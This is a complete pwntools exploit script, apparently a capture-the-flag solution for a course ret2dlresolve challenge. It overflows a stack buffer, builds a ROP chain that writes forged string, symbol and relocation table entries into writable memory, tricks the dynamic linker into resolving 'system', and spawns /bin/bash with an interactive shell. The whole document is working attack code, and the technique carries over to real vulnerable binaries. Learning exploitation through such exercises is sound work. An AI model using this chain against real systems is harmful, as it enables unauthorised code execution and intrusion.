from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b *0x401020
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-ret2dlresolve-1.chals.io", 443, ssl=True, sni="cse4850-ret2dlresolve-1.chals.io")
    return process(e.path)

# Gadgets
pop_r10 = (r.find_gadget(['pop r10', 'ret']))[0]
mov_rdi_r10 = 0x401190
ret = (r.find_gadget(['ret']))[0]

# Location of structures
init_plt = 0x401020
symbtab = 0x4003d0
strtab = 0x4004a8
jmp_rel = 0x4005d0

# Where we place things
writeable_mem = 0x0404e10
fake_strtab = writeable_mem
fake_symbtab = writeable_mem + 0x18
fake_rel = writeable_mem + 0x38
fake_args = writeable_mem + 0x50

# Calculate fields
assert (fake_rel - jmp_rel) % 24 == 0
dl_resolve_index = int((fake_rel - jmp_rel) / 24)
assert (fake_symbtab - symbtab) % 24 == 0
r_info = int((fake_symbtab - symbtab) / 24) << 32 | 0x7
st_shndex = fake_strtab - strtab

p = start()

# Creates call to gets chain
chain = cyclic(16)
chain += p64(ret) # Stops mov_aps nonsense
chain += p64(pop_r10)
chain += p64(fake_strtab)
chain += p64(mov_rdi_r10)
chain += p64(e.plt['gets'])

# Creates call to init_plt
chain += p64(pop_r10)
chain += p64(fake_args)
chain += p64(mov_rdi_r10)
chain += p64(init_plt)

# Adds custom entry number
chain += p64(dl_resolve_index)
p.sendline(chain)

# Adds string to memory
payload = b'system\x00\x00'

# Adds symbol table entry
payload += p64(0x0)
payload += p64(0x0)
payload += p64(st_shndex)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

# Adds rel table
payload += p64(fake_strtab)
payload += p64(r_info)
payload += p64(0x0)

# Adds /bin/bash to be called by system
payload += b'/bin/bash\x00'
p.sendline(payload)

p.interactive()